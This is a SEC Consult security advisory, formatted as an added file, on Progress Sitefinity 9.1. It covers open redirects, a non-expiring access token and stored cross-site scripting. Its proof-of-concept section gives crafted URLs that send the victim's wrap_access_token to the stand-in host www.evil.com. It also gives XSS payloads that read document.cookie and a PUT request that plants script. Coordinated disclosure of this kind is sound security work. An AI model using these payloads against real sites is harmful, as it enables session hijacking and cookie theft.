@@ -1,0 +1,237 @@
+id: 28357
+date: 08/23/2017
+title: Progress Sitefinity 9.1 XSS Vulnerability
+author: Mingshuo Li
+cves: 
+
+=======================================================================
+              title: Multiple vulnerabilities
+            product: Progress Sitefinity
+ vulnerable version: 9.1
+      fixed version: 10.1
+         CVE number: -
+             impact: High
+           homepage: http://www.sitefinity.com | https://www.progress.com
+              found: 2016-10-21
+                 by: Siddhartha Tripathy & Mingshuo Li (Office Singapore)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Progress Sitefinity is a content management and marketing analytics
+platform designed to maximize the agility needed to succeed in todayas rapidly
+changing digital marketplace.
+It provides developers and IT teams the tools they need to support
+enterprise-level digital marketing, optimizing the customer journey by
+delivering seamless personalized experiences across different technologies and
+devices. Progress is a trusted source for the digital marketing innovation
+needed to create transformative customer experiences that fuel business
+success."
+
+Source: http://www.sitefinity.com/about
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends applying the provided patches by the vendor immediately.
+
+Additionally, there are strong indications for further vulnerabilities and it
+is highly suggested to perform a thorough security review by security
+professionals to lower the risk of using this product.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Open Redirect Vulnerabilities
+Several scripts of Sitefinity are vulnerable to an open redirect. This
+vulnerability allows an attacker to redirect the victim to any site by using a
+manipulated link (e.g. a manipulated link in a phishing mail, forum or a
+guestbook). The redirection target could imitate the original site and might
+be used for phishing attacks or for running browser exploits to infect the
+victimas machine with malware. Because the server name in the manipulated link
+is identical to the original site, phishing attempts have a more trustworthy
+appearance.
+
+In the first instance of this vulnerability, the open redirect will forward
+an authentication token to the attacker controlled site, which can be abused
+by the attacker to initiate new sessions for the affected user.
+
+
+2) Broken Session Management
+During the authentication process, Sitefinity creates an authentication token
+"wrap_access_token", which is further used as a GET parameter to initiate a
+valid session if the supplied credentials have been verified to be correct.
+Transporting this token as GET parameter causes unnecessary exposure of the
+sensitive token, as it might end up in proxy or access logs.
+
+Furthermore, this token is not tied to the session ID and can be used to
+generate new valid sessions for the user, even if the initial session has been
+terminated by the user. The token will also survive a password change (e.g. if
+the user suspects misuse of his account) and can still be used to initiate new
+sessions. During the timeframe of testing, no expiry of the token could be
+observed. The wrap_access_token can thus be seen as a "Kerberos golden ticket"
+for Sitefinity.
+
+
+3) Permanent Cross-Site Scripting
+Multiple scripts do not properly sanitize/encode user input, which leads to
+permanent cross site scripting vulnerabilities. Furthermore, the web
+application allows users to upload HTML files, which are provided via the same
+domain, allowing an authenticated attacker to access arbitrary information and
+execute arbitrary functions of Sitefinity on behalf of other users. These
+vulnerabilities can be used by attackers to circumvent segregation of duties.
+
+
+Proof of concept:
+-----------------
+1a) Open Redirection with Access Token
+On the Sitefinity login site, the "realm" parameter will point the user to the
+actual location, once the user authenticates successfully. The parameter must
+start with the actual URL "http://www.example.com" to act as a valid
+destination. However, the filter can be circumvented by appending the at
+symbol ("%40", @) followed by an attacker controlled host name (e.g.
+"www.evil.com"). In this case, the original URL will be forwarded to the
+attacker controlled host as username.
+
+Successfully authenticating with the below URL will forward the victim to the
+attacker controlled host "www.evil.com"
+
+===============================================================================
+http://www.example.com/Sitefinity/Authenticate/SWT?realm=http:%2f%2fwww.example
+.com%40www.evil.com%2f&redirect_uri=%2fsitefinity%2f&deflate=true
+===============================================================================
+
+This vulnerability will not only redirect the user to arbitrary websites, but
+Sitefinity will also transmit the parameter "wrap_access_token" as GET
+parameter to the request. After successful authentication, the following
+request will be made to the attacker controlled host:
+
+===============================================================================
+GET /sitefinity/?wrap_deflated=true&wrap_access_token=vZPPbtd[...]AQ%3d%3d&wrap
+_access_token_expires_in=3600 HTTP/1.1
+===============================================================================
+
+The access token can be used by the attacker to create a valid session with
+Sitefinity for the victim user, by appending the obtained wrap_access_token to
+the following request:
+
+===============================================================================
+http://www.example.com/sitefinity/?wrap_deflated=true&wrap_access_token=vZPPbtd
+[...]AQ%3d%3d&wrap_access_token_expires_in=3600
+===============================================================================
+
+Furthermore, the wrap_access_token remains valid for an extended time (more
+than 24 hours during the test period) and can be used to create new sessions
+for the affected user even after the initial session was terminated by logging
+out or after the credentials have been changed (refer to vulnerability (2))
+
+
+1b) Open Redirection in the sign-out URL
+The parameter "ReturnUrl" of the sign-out function is vulnerable to open
+redirect. Calling the following request will redirect the victim user to an
+attacker controlled site after confirming the logout:
+
+===============================================================================
+http://www.example.com/sitefinity/signout/selflogout?ReturnUrl=//www.evil.com
+===============================================================================
+
+
+2) Broken Session Management
+After successful authentication, the following request including the parameter
+access_wrap_token will be made to the Sitefinity server:
+
+===============================================================================
+GET /sitefinity/?wrap_deflated=true&wrap_access_token=vZPPbtd[...]AQ%3d%3d&wrap
+_access_token_expires_in=3600 HTTP/1.1
+===============================================================================
+
+
+3a) Permanent Cross-Site Scripting in the Content Management Template Configuration
+In the Sitefinity content management area, there is a text box where users can
+insert text/html content. The user supplied input is not properly sanitized /
+encoded and executed in the context of Sitefinity. A simple proof-of-concept
+is provided below:
+
+===============================================================================
+<img alt="" src=x onerror=alert(document.cookie) />
+<svg/onload=prompt(1)>
+===============================================================================
+
+The following PUT request is used to persist the JavaScript/HTML code:
+
+===============================================================================
+PUT /Sitefinity/Services/DynamicModules/Data.svc/00000000-0000-0000-0000-000000
+000000/?itemType=Telerik.Sitefinity.DynamicTypes.Model.TemplateConfiguration.Te
+mplateconfiguration&providerName=OpenAccessProvider&managerType=Telerik.Sitefin
+ity.DynamicModules.DynamicModuleManager&provider=OpenAccessProvider&workflowOpe
+ration=Publish HTTP/1.1
+Host: www.example.com
+Cookie: [...snip...]
+Connection: close
+
+{"Item":{"__type":"Templateconfiguration:Telerik.Sitefinity.DynamicTypes.Model.
+TemplateConfiguration","ApprovalWorkflowState":{"PersistedValue":"","Value":""}
+,"Author":null,"AvailableLanguages":[],"DateCreated":"\/Date(1475201660265)\/",
+"Distance":0,"EmailContent":{"PersistedValue":"<img alt=\"\" onerror=\"alert(1)
+\" src=\"x\" />","Value":""},"EmailSubject":{"PersistedValue":"","Value":""},"E
+xpirationDate":null,"IncludeInSitemap":"true","IsDeletable":false,"IsEditable":
+false,"ItemDefaultUrl":{"PersistedValue":"","Value":""},"[...snip...]
+===============================================================================
+
+3b) Permanent Cross-Site Scripting via File Upload
+The Sitefinity content management area provides file upload functionality to
+the users. A user can upload related documents to the website. The application
+also supports uploading of HTML files. These HTML files are later displayed in
+the same domain as the Sitefinity application, which allows JavaScript code
+embedded in the HTML file to access arbitrary information and functionality of
+Sitefinity users viewing this crafted HTML file.
+
+
+3c) Permanent Cross-Site Scripting in the New User Creation form
+In the Sitefinity content management area an Administrator can create new
+users. In the New User Creation Page some parameters such as "Last name",
+"First name", and "About" are vulnerable to cross site scripting attacks. An
+attacker can inject malicious JavaScript payloads directly via the user
+interface.
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version of Progress Sitefinity has been tested which was the most
+recent version at the time of discovery: 9.1
+
+
+Vendor contact timeline:
+------------------------
+2016-10-21: Contacting vendor through support, requesting encrypted
+            communication
+2016-10-25: Support team provides contact of Sitefinity Product Management
+2016-10-25: Sending unencrypted advisory to Sitefinity Porduct Management
+            as requested by vendor
+2016-10-27: Vendor confirmed to "release a patch early next week" for the
+            Open Redirect issues and XSS to be fixed in version 9.3 and 10.0.
+2016-11-02: Vendor sugguested mitigation on Broken Session Management.
+2017-03-14: Vendor releases version 10.0.
+2017-04-26: Vendor confirmed to implement XSS sanitizer in version 10.1.
+2017-04-27: Vendor confirmed Broken Session Management to be fixed in 10.0.
+2017-07-10: Vendor releases version 10.1.
+2017-08-22: Public release of security advisory
+
+
+Solution:
+---------
+According to the vendor, all the identified issues have been fixed in
+version 10.1.
+
+Please update to the latest version immediately.
+Vendor release notes: http://www.sitefinity.com/product/version-notes
+
+#  0day.today [2023-03-22]  #
